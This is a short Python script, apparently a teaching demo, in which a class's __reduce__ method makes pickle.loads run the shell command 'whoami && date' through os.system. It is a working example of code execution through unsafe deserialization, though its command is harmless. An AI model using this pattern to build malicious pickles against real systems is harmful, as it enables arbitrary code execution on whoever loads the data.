import pickle

class hello:
	def __reduce__(self):
		import os
		return (os.system, ('whoami && date',))

# Serialization
print("lets begin the Serialization")
serialize = pickle.dumps(hello())
print("Serialized data",serialize)

# Deserialization
print("lets begin the Derialization")
deserialize = pickle.loads(serialize)
